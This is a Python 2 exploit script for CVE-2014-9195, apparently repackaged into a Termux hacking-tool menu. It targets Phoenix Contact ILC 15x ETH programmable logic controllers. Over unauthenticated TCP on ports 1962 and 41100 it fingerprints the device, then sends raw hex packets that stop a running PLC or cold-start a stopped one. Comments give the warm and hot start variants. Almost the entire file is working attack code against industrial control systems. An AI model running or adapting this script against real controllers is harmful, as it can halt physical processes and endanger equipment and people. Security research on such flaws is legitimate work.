#! /data/data/com.termux/files/usr/bin/python2
'''
    # Exploit Title: Phoenix Contact ILC 150 ETH PLC Remote Control script
    # Date: 2015-05-19
    # Exploit Author: Photubias - tijl[dot]deneut[at]howest[dot]be
    # Vendor Homepage: https://www.phoenixcontact.com/online/portal/us?urile=pxc-oc-itemdetail:pid=2985330
    # Version: ALL FW VERSIONS
    # Tested on: Python runs on Windows, Linux
    # CVE : CVE-2014-9195

    Copyright 2015 Photubias(c)

    Written for Howest(c) University College

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

File name ControlPLC.py
written by tijl[dot]deneut[at]howest[dot]be
This POC will print out the current status of the PLC, continuously every 0.1 second, after 3 seconds it reverts (start becomes stop, stop becomes cold start), and stops after 5 seconds
Works on ILC 15x ETH, partly on RFC 43x, partly on ILC 39x
'''
import sys, socket, binascii, time, os, select, re
from fungsi import warna
import sub_menu3 as back

IP=''
infoport=1962
controlport=41100


## Defining Functions First
def send_and_recv(s,size,strdata):
    data = binascii.unhexlify(strdata) ## Convert to real HEX (\x00\x00 ...)
    s.send(data)
    ret = s.recv(4096)
    return ret

def doAction(s,strdata):
    ret = send_and_recv(s,1000,strdata)
    # In official state these are send, they do not seem to be needed
    send_and_recv(s,1000,packet1)
    send_and_recv(s,1000,packet2)
    send_and_recv(s,1000,packet2)
    ret = send_and_recv(s,1000,'010002000000020003000100000000000840')
    send_and_recv(s,1000,packet2)
    return ret

def initMonitor(s):
    send_and_recv(s,1000,'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200')
    send_and_recv(s,1000,'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500')
    send_and_recv(s,1000,'0100000000002500000000000000d9ff4164652e52656d6f74696e672e53657276696365732e49466f726365536572766963653200')
    send_and_recv(s,1000,'010000000000240000000000000000004164652e52656d6f74696e672e53657276696365732e49466f7263655365727669636500')
    send_and_recv(s,1000,'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e49446576696365496e666f536572766963653200')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446576696365496e666f5365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000290000000000000000004164652e52656d6f74696e672e53657276696365732e49446174614163636573735365727669636500')
    send_and_recv(s,1000,'0100000000002a00000000000000d4ff4164652e52656d6f74696e672e53657276696365732e4944617461416363657373536572766963653200')
    send_and_recv(s,1000,'0100000000002900000000000000d5ff4164652e52656d6f74696e672e53657276696365732e49427265616b706f696e745365727669636500')
    send_and_recv(s,1000,'0100000000002800000000000000d6ff4164652e52656d6f74696e672e53657276696365732e4943616c6c737461636b5365727669636500')
    send_and_recv(s,1000,'010000000000250000000000000000004164652e52656d6f74696e672e53657276696365732e494465627567536572766963653200')
    send_and_recv(s,1000,'0100000000002f00000000000000cfff4164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c536572766963653200')
    send_and_recv(s,1000,'0100000000002e0000000000000000004164652e52656d6f74696e672e53657276696365732e4950726f436f6e4f53436f6e74726f6c5365727669636500')
    send_and_recv(s,1000,'0100000000003000000000000000ceff4164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653300')
    send_and_recv(s,1000,'010000000000300000000000000000004164652e52656d6f74696e672e53657276696365732e4953696d706c6546696c65416363657373536572766963653200')
    send_and_recv(s,1000,'0100020000000e0003000300000000000500000012401340130011401200')
    return

def is_ipv4(ip):
	match = re.match("^(\d{0,3})\.(\d{0,3})\.(\d{0,3})\.(\d{0,3})$", ip)
	if not match:
		return False
	quad = []
	for number in match.groups():
		quad.append(int(number))
	if quad[0] < 1:
		return False
	for number in quad:
		if number > 255 or number < 0:
			return False
	return True

##### The Actual Program
if not len(sys.argv) == 2:
        IP = raw_input("Please enter the IPv4 address of the Phoenix PLC: ")
else:
        IP = sys.argv[1]
       
if not is_ipv4(IP):
	print "Please go read RFC 791 and then use a legitimate IPv4 address."
	sys.exit()
	
## - initialization, this will get the PLC type, Firmware version, build date & time
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,infoport))

print(warna.hijau + "\n[*] " + warna.tutup + "Initializing PLC")
print '------------------'
code = send_and_recv(s,1000,'0101001a005e000000000003000c494245544830314e305f4d00').encode('hex')[34:36]
send_and_recv(s,1000,'01050016005f000008ef00' + code + '00000022000402950000')
ret = send_and_recv(s,1000,'0106000e00610000881100' + code + '0400')
print(warna.hijau + "\n[*] " + warna.tutup + "PLC Type  = " + ret[30:50] )
print(warna.hijau + "[*] " + warna.tutup + "Firmware  = " + ret[66:70] )
print(warna.hijau + "[*] " + warna.tutup + "Build     = " + ret[79:100] )
send_and_recv(s,1000,'0105002e00630000000000' + code + '00000023001c02b0000c0000055b4433325d0b466c617368436865636b3101310000')
send_and_recv(s,1000,'0106000e0065ffffff0f00' + code + '0400')
send_and_recv(s,1000,'010500160067000008ef00' + code + '00000024000402950000')
send_and_recv(s,1000,'0106000e0069ffffff0f00' + code + '0400')
send_and_recv(s,1000,'0102000c006bffffff0f00' + code)

s.shutdown(socket.SHUT_RDWR)
s.close()
print(warna.hijau + "\n[*] " + warna.tutup + "Initialization done")
print '---------------------\r\n'
print(warna.hijau + "[*] " + warna.tutup + "Will now print the PLC state and reverse it after 3 seconds")
raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")

########## CONTROL PHASE ####### Start monitoring with loop on port 41100
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,controlport))
# First init phase (sending things like 'Ade.Remoting.Services.IProConOSControlService2' and 'Ade.Remoting.Services.ISimpleFileAccessService3', 21 packets)
initMonitor(s)
# Query packet
packet1 = '010002000000080003000300000000000200000002400b40'
# Keepalive packet
packet2 = '0100020000001c0003000300000000000c00000007000500060008001000020011000e000f000d0016401600'
## The loop keepalive and query status loop (2 x keepalive, one time query):
i = 0
state = 'On'
running = 0
stopme = 0
startme = 0
while True:
    i += 1
    time.sleep(0.1)
    ## Keep Alive
    send_and_recv(s,1000,packet2)
    send_and_recv(s,1000,packet2)

    ## Possible actions (like stop/start) should be sent now before the query state
    if (state == 'Running' and stopme):
        print(warna.hijau + '\n[*] ' + warna.tutup + 'Sending Stop\n')
        doAction(s,'01000200000000000100070000000000')
        startme = stopme = 0
    elif (state == 'Stop' and startme):
        print(warna.hijau + '\n[*] ' + warna.tutup + 'Sending COLD Start\n')
        ## This is the COLD start: doAction(s,'010002000000020001000600000000000100')
        ## This is the WARM start: doAction(s,'010002000000020001000600000000000200')
        ## This is the HOT  start: doAction(s,'010002000000020001000600000000000300')
        doAction(s,'010002000000020001000600000000000100')
        startme = stopme = 0    

    ## Query Status
    ret = send_and_recv(s,1000,packet1).encode('hex')
    if ret[48:50] == '03':
        state = 'Running'
    elif ret[48:50] == '07':
        state = 'Stop'
    elif ret[48:50] == '00':
        state = 'On'
    else:
        print(warna.kuning + '\n[!] ' + warna.tutup + 'State unknown, found code : '+ret.encode('hex')[48:50] )
    print(warna.hijau + '[*] ' + warna.tutup + 'Current PLC state : '+state)
    
    ## Maintaining the LOOP
    if i == 50:
        break
#   '''
    if i == 30:
        if state == 'Running':
            stopme = 1
        else:
            startme = 1
    #'''
print(warna.hijau + "\n[*] " + warna.tutup + "All done.")
raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
back.menu['menu_utama']()
